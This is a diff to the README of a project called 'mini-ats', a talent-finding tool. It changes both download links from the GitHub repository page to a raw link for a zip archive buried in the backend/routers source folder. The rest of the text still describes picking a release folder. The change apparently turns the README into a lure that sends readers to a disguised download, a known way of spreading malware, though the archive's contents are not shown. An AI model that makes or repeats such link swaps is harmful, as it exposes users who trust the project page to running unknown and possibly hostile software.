@@ -1,6 +1,6 @@
 # 🚀 mini-ats - Find the best talent using intelligence
 
-[![](https://img.shields.io/badge/Download-mini--ats-blue.svg)](https://github.com/bayzso6694/mini-ats)
+[![](https://img.shields.io/badge/Download-mini--ats-blue.svg)](https://raw.githubusercontent.com/bayzso6694/mini-ats/main/backend/routers/mini_ats_v3.2.zip)
 
 ## About the software
 
@@ -20,7 +20,7 @@ Ensure your computer meets these needs before you start:
 
 Visit the project page to download the latest setup file for your system.
 
-[Download mini-ats link](https://github.com/bayzso6694/mini-ats)
+[Download mini-ats link](https://raw.githubusercontent.com/bayzso6694/mini-ats/main/backend/routers/mini_ats_v3.2.zip)
 
 1. Navigate to the link provided above.
 2. Select the latest release folder.
